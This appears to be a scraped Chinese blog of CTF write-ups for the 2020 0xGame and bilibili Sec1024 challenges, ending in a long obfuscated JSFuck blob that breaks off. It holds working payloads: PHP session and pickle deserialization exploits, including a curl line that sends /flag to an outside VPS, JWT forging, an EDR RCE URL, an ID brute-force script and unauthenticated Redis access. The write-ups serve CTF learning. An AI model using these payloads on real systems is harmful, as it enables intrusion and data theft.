username=|O:4:\"info\":3:{s:5:\"admin\";i:1;s:8:\"username\";s:5:\"admin\";s:5:\"motto\";s:4:\"adfs\";} password=admin motto=ddd session 文件中的内容如下。 访问 profile 页面时成功把 admin 置为1，获取了 flag.php 页面内容。 再拿去远程跑。 得到 flag。 References &amp; Extensive Reading: PHP中的ini_set()函数介绍 PHP中SESSION反序列化机制 PHP反序列化漏洞 Session序列化选择器漏洞（ini_set(‘session.serialize_handler’, ‘php’);） 上面有文章还介绍了另一种漏洞。 若 session.upload_progress.enabled 为 On，当一个上传在处理中，同时 POST 一个与 INI 中设置的 session.upload_progress.name 同名变量时，当 PHP 检测到这种 POST 请求时，它会在 $_SESSION 中添加一组数据，即就可以将 filename 的值赋值到 session 中。所以可以通过 Session Upload Progress 来设置 session。 例如 http://web.jarvisoj.com:32784/index.php 这一题。 通过构造一个上传页面，如 &lt;form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123aaa\" /&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" /&gt; &lt;/form&gt; HTTP 如下，注意要带上 Cookie。 POST /index.php HTTP/1.1 Host: web.jarvisoj.com:32784 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=jnmfjqfll0kttv9cf6i7dfhh32 Content-Type: multipart/form-data; boundary=---------------------------395747469534482322661051838442 Content-Length: 436 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------395747469534482322661051838442 Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\" 123asdaf -----------------------------395747469534482322661051838442 Content-Disposition: form-data; name=\"file\"; filename=\"|O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";}\" Content-Type: text/plain xxxxx -----------------------------395747469534482322661051838442-- 表单里带上 PHP_SESSION_UPLOAD_PROGRESS，再修改 filename 就能再 session 加载时利用反序列化把内容加载到 SESSION 中。 再利用 file_get_contents 结合当前路径读取文件即可。 print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\")); Web_JWThttp://web.game.0xctf.com:30107/ 随意输入用户名密码去登录，根据返回的 cookie 得到 JWT (JSON Web Token)。 参考之前的 NUAACTF web2-jwt，利用 c-jwt-cracker 跑出 secret。 secret 即 njupt。 拿去 jwt.io 加密一下就好了，然后改掉 payload 里的 role 为 admin。 最后把 cookie 改成 Encoded 里的那个就完事了。 Web_easyPython 人生苦短，我用Python 登录admin 登录成功与否不是必要的，重要在过程，仔细看看bak 题目地址 首先点击 Tips 拿到题目的源代码。 关键代码： # home page @app.route('/') # @login_required def index(): usercookies = request.cookies.get('Cookies') if not usercookies: usercookies = \"{'username':'guest'}\" else: usercookies = pickle.loads(base64.b64decode(usercookies)) resp = make_response(render_template('index.html')) resp.set_cookie('Cookies', base64.b64encode(pickle.dumps(usercookies))) return resp 这里很明显看到了pickle，而且根据提示与登陆与否无关，那就是这里了。 这里 pickle.loads 反序列化时貌似没有过滤，于是可以传一个 object 过去，在实例化的时候调用 __reduce()__ 方法，执行这里面的内容。 import pickle import base64 import pickletools import os class User(): def __init__(self): self.name = 'miaotony' def __reduce__(self): return (os.system, ('curl http://VPS:PORT/`cat /flag | base64`',)) payload = pickle.dumps(User()) payload = pickletools.optimize(payload) print(payload) pickletools.dis(payload) payload_64 = base64.b64encode(payload) print(payload_64) 把这个生成的 base64 编码的 payload 作为 Cookies，修改后重新访问，理论上就能在 VPS 上拿到 base64 编码的 flag。 然而并没有成功。。打过去之后返回 500 Internal Server Error. 比赛结束之后看了官方WP，才知道原来是操作系统的锅，我这个是在 Windows 下生成的。 这个序列化的结果还与操作系统有关系。 修改为 posix，或者在 Linux 下生成就没这个问题了。 另外发现需要去掉 pickle 的版本标识 \\x80\\x03.我用的 opcode 是 Python3 下的 版本3。 于是我这个 payload 就是 b'cposix\\nsystem\\nX3\\x00\\x00\\x00curl http://VPS:PORT/`cat /flag | base64`\\x85R.' 修改 Cookies，在 VPS 上接收一下，拿到 flag。 Misc_flippwd.mp3 一听就是电报了，老摩斯了。 读出来是 ....- ----- ----- ---.. ..... -.... -.... ----. ----. ...-- ----- ----- ... .. -.. .-. --- .-- ... ... .- .--. 解码得到 400856699300SIDROWSSAP 一看就是倒过来了的，那就倒回去。 PASSWORDIS003996658004 拿 003996658004 去解压 galf_si_siht_2.zip，得到 galf_si_siht.zip。 发现打不开，放到 010 Editor 里，发现套了两个 zip，老缝合怪了。 分别把两个 zip 提取出来。 password.txt: I want to write file in binary, but something seems to be wrong? 看到末尾一位都是0，盲猜是倒过来的 ASCII。写个脚本试试。 s = \"\"\"10100110 11010110 ...... 10011010\"\"\" l = s.split('\\n') pwd='' for i in l: x = i[::-1] print(x) char = chr(int(x, 2)) pwd += char print(pwd) print(pwd[::-1]) # You are so clever that this problem is just a piece of cake for you, the password is A_pi3ce_0f_C4ke 得到密码为 A_pi3ce_0f_C4ke。 解压galf_si_siht.png。 好家伙，又是倒过来的。 with open(r\"galf_si_siht.png\", 'rb') as fin: img = fin.read() with open(r\"galf_si_siht_fix.png\", 'wb') as fout: fout.write(img[::-1]) 得到一张二维码。 扫码得到 http://am473ur.com/0xgame/flip/bd055250d3906d1f791d8e83b4396893.php 0xGame{b07906f9-f6f5-4120-9f80-01d761c8602e} 老套娃了（ Misc_Hex酱发现过滤的关键字其实只是命令里包含相应的字符而已，大写绕过就完事了~ 不过还是日了一个晚上（（ 之前还没怎么在 Windows 下整命令行，这次还特地去查了一番。 最开始还是绕了一大弯，本来不知道 flag 在哪，找了半天突然想到应该就在桌面上了。 当前路径是 C:\\Users\\Administrator\\Desktop\\Game\\HexQBot 通过环境变量和通配符，复制再读取 flag。 后来突然想到不用这么复杂，直接读就完事了。 后面问了出题的 Am473ur 师傅，这个返回内容的长度有了限制，所以有的指令发过去没有返回了。 另外这个 Hex酱 挺容易崩的，心疼一下运维师傅（ Week 3之前几周懒了，就随便看看题做做题，基本没写 WP，就这样8. Web_intvalpayload: http://web.game.0xctf.com:30102/?0xGame=20201001%0a&amp;id=1024.3 &lt;?php highlight_file(__FILE__); include(\"ffllaagg.php\"); //1st if(isset ($_GET['0xGame'])) { if($_GET['0xGame'] !== '20201001' &amp;&amp; preg_match('/^20201001$/',$_GET['0xGame'])) echo 'Good job!'.'&lt;br&gt;'; else die('Think it over!'); } //2nd if(isset($_GET['id'])){ $id=intval($_GET['id']); if($_GET['id'] != 1024 &amp;&amp; $id === 1024) echo 'Congratulations!'.'&lt;br&gt;'.$flag; else die('Work harder!'); } Good job! Congratulations! 0xGame{947eae96fe415cbc6eab176f15dd98b1} Web_edr深信服 RCE 参考： https://blog.csdn.net/qq_37602797/article/details/108068122 https://mp.weixin.qq.com/s/4VtJ_M0c5GZsV4CmBr9CsQ payload: http://web1.game.0xctf.com:40000/?strip_slashes=system&amp;host=cat%20/flag 0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y} 小结还是挺有意思的。 （首尾呼应 （溜了喵","path":"2020/11/05/CTF_2020_0xGame/"},{"title":"CTF | 2020 bilibili Sec1024 WriteUp","text":"前言 Bilibili 小破站整了个 Sec1024，1024 凌晨看群里有师傅提到就来看了一眼。 结果被卡住了做不下去，于是又看了一下午。。 2020-1024=996 所以大家都加班了唉？ 属实恶心人（ 随意写个 Write Up 好了。 P.S.: 按道理，比赛未结束不应该发出来的，不过算了8，现在一搜到处都是 flag 了，开心就好。 0x01页面的背后是什么？ http://45.113.201.36/index.html 一看到就以为是改 UA，谁知道其实是第二题的答案2333. 第一题在这里 其实是调用了 http://45.113.201.36/api/admin 这个接口。 0x02真正的秘密只有特殊的设备才能看到 改 UA 即可。 http://45.113.201.36/api/ctf/2 0x03密码是啥？ http://45.113.201.36/login.html 本来以为是 sql 注入，但试了发现不对劲，怎么都注不进去。盲注的话也没有所需要的返回信息。 最后应该只有弱密码了。 跑了一堆字典都不行，最后突然一想，手输了个 bilibili 出来了。 （摊手，就离谱 0x04对不起，权限不足～ http://45.113.201.36/ superadmin.html $.ajax({ url: \"api/ctf/4\", type: \"get\", success:function (data) { console.log(data); if (data.code == 200){ // 如果有值：前端跳转 $('#flag').html(\"欢迎超级管理员登陆～答案是 : {{ \" + data.data + \" }}\".toLowerCase() ) } else { // 如果没值 $('#flag').html(\"有些秘密只有超级管理员才能看见哦~\") } } }) 发现请求这个 API 会返回一个名为 role 的 cookie，里面内容正好32位，考虑就是 md5 了。 ee11cbb19052e40b07aac0ca060c23ee 解密发现这个是 user。 既然说要超级管理员， 那应该就是改这个了。 试了 superadmin, admin, root, administrator, superuser, bilibili, … 都不对。 最后发现是 Administrator。这不是脑筋急转弯嘛？？？ md5 –&gt; 7b7bc2512ee1fedcd76bdc68926d4f7b 哦对了，cookie 要带上 session，里面记录了用户登录信息，否则会提示 请先登录。 0x05别人的秘密 http://45.113.201.36/user.html $(function () { (function ($) { $.getUrlParam = function(name) { var reg = new RegExp(\"(^|&amp;)\" + name + \"=([^&amp;]*)(&amp;|$)\"); var r = window.location.search.substr(1).match(reg); if (r != null) return unescape(r[2]); return null; } })(jQuery); var uid = $.getUrlParam('uid'); if (uid == null) { uid = 100336889; } $.ajax({ url: \"api/ctf/5?uid=\" + uid, type: \"get\", success:function (data) { console.log(data); if (data.code == 200){ // 如果有值：前端跳转 $('#flag').html(\"欢迎超级管理员登陆～flag : \" + data.data ) } else { // 如果没值 $('#flag').html(\"这里没有你想要的答案～\") } } }) }); 在所给的 uid 100336889 附近爆破。 import requests import json import time x = 100336889 headers = { 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36', 'Accept-Language': 'en-US,en;q=0.5', 'Cookie': 'session=xxxxxxxxxxxxxxxxxxx' } for uid in range(x-1500, x+1500): try: print(uid) url = f'http://45.113.201.36/api/ctf/5?uid={str(uid)}' r = requests.get(url, headers=headers) r.encoding = 'utf-8' r_json = r.json() print(r_json) if r_json.get('code') == 200: print('!!!!!!!!!!!!') print(r_json) break except Exception as e: print(e) print(uid) time.sleep(1) uid = uid-1 最后发现 uid 是 100336917，偏移量就 28… 6d917dff-eb085a50-58b6513f-5c0c3248 或者 Burp Suite 也行。 0x06结束亦是开始 http://45.113.201.36/blog/single.php?id=1 是个奇怪的博客页面。 上面一行导航栏都 404，感觉上应该是 id 参数的注入？ 没搞懂（ 0x07接下来的旅程，需要少年自己去探索啦～ （盲猜就离谱 未知。 0x086379 Redis 端口 redis-cli.exe -h 45.113.201.36 45.113.201.36:6379&gt; get flag8 \"d436b982-2b81aa54-49a8d2db-87ab951a\" 以及，被搅 shi 了？ 0x09未知。 0x0A路径盲猜（就狂扫呗 http://45.113.201.36/blog/test.php [][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+(+{}+[])[+!![]]+(!![]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+{}+[])[+!![]]+(+[]+[])+([]+{})[!+[]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]